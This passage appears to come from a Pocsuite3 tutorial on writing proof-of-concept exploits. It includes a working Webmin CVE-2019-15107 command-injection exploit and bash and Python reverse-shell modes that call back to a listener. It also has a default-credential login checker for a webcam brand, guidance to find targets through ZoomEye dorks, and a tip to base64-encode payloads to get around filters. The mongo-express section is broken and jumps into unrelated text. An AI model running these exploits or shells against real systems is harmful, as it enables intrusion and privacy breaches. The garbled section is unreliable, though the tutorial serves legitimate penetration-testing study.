            result = {}
            # self.get_option() method can obtain customized command line parameters
            param = self.get_option('cmd')
            res = self._exploit(param)
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo'][param] = res
            # Call self.parse_output(), return the result
            return self.parse_output(result)
        # Implementation of shell mode
        def _shell(self):
            try:
                self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))
            except Exception:
                pass
    # Register this PoC to the framework
    register_poc(DemoPOC)
Based on the above PoC template, combined with vulnerability details,
rewrite`_exploit()` method：
    def _exploit(self, param=''):
        if not self._check(dork='Login to Webmin'):
            return False
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url}/session_login.cgi'
        }
        payload = f'user=rootxx&pam=&expired=2&old=test|{param}&new1=test2&new2=test2'
        res = requests.post(f'{self.url}/password_change.cgi', headers=headers, data=payload)
        logger.debug(res.text)
        return res.text.split('The current password is incorrect')[-1].split('')[0]
Then we will set up the docker range for testing, `docker run -it --rm -p
10000:10000 pocsuite3/cve-2019-15107`.
verify mode ok:
The attack mode obtains the execution of command line parameters and returns
the results, `--options` parameter can view the additional command line
parameters defined by PoC:
Shell mode does not work with bash payload, so use Python instead. It should
be noted that because there are some special characters in the payload, it
needs to be analyzed in combination with the specific situation of the
vulnerability, such as using base64 encoding to bypass the restriction.
         def _shell(self):
             try:
    -            self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))
    +            self._exploit(REVERSE_PAYLOAD.PYTHON.format(get_listener_ip(), get_listener_port()))
             except Exception:
                 pass
shell mode ok：
## 5.4 mongo-express authentication remote code execution
vulnerability（CVE-2019-10758）
Vulnerability details：[mongo-express remote code execution
vulnerability（CVE-2019-10758）](https://www.seebug.org/vuldb/ssvid-98116)
Mongo-express is an open source MongoDB Web management interface based on
Node.js and express. `mongo-express 1.24.3` will delete `../` from the request URL, which affects many
security tools. See issue：https://github.com/urllib3/urllib3/issues/1790 for
more details
Pocsuite3 hook part of the code of urllib3 and requests, supporting`../`, and
the encoding of special characters is cancelled.
## 5.6 A webcam login bypass vulnerability
Vulnerability details：[[A webcam login bypass and multiple remote code
execution vulnerabilities based on stack overflow and data analysis
report](https://paper.seebug.org/652/ "A webcam login bypass and multiple
remote code execution vulnerabilities based on stack overflow and data
analysis report")]
The Web service of this brand camera is based on HTTP basic authentication,
and there are three groups of default credentials corresponding to different
permission levels. The three groups of default credentials are:
`admin:admin`，`user:user`，`guest:guest`. During installation, the app will
only remind you to change the default password of the admin account.
It is worth mentioning that user accounts and guest accounts can also view
video streams. Most users will not change the default passwords of these
accounts, resulting in privacy disclosure.
Generate template：
    →pocsuite --new
    ...
    0    Arbitrary File Read
    1    Code Execution
    2    Command Execution
    3    Denial Of service
    4    Information Disclosure
    5    Login Bypass
    6    Path Traversal
    7    SQL Injection
    8    SSRF
    9    XSS
    Vulnerability type, choose from above or provide (eg, 3) []: 5
    ...
Modify template：
    -    def _options(self):
    -        o = OrderedDict()
    -        o['param'] = OptString('', description='The param')
    -        return o
    -         def _exploit(self, param=''):
    -        if not self._check(dork=''):
    +        if not self._check(dork='Error: username or password error,please input again.'):
                 return False
    -        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    -        payload = 'a=b'
    -        res = requests.post(self.url, headers=headers, data=payload)
    -        logger.debug(res.text)
    -        return res.text
    +        creds = {'admin': 'admin', 'user': 'user', 'guest': 'guest'}
    +        valid_creds = {}
    +        for u, p in creds.items():
    +            res = requests.get(self.url, auth=(u, p))
    +            if res.status_code != 401:
    +                valid_creds[u] = p
    +        return valid_creds
         def _verify(self):
             result = {}
    @@ -53,17 +48,11 @@ class DemoPOC(POCBase):
             if res:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = self.url
    -            result['VerifyInfo'][param] = res
    +            result['VerifyInfo']['Info'] = res
             return self.parse_output(result)
         def _attack(self):
    -        result = {}
    -        param = self.get_option('param')
    -        res = self._exploit(param)
    -        result['VerifyInfo'] = {}
    -        result['VerifyInfo']['URL'] = self.url
    -        result['VerifyInfo'][param] = res
    -        return self.parse_output(result)
    +        return self._verify()
Use `--dork-zoomeye` to specify keywords to retrieve targets from ZoomEye for
detection.
# 6 Conclusion
If you encounter any problems or have any new ideas, please feel free to
submit the issue () or PR
()
YouTube：
* * *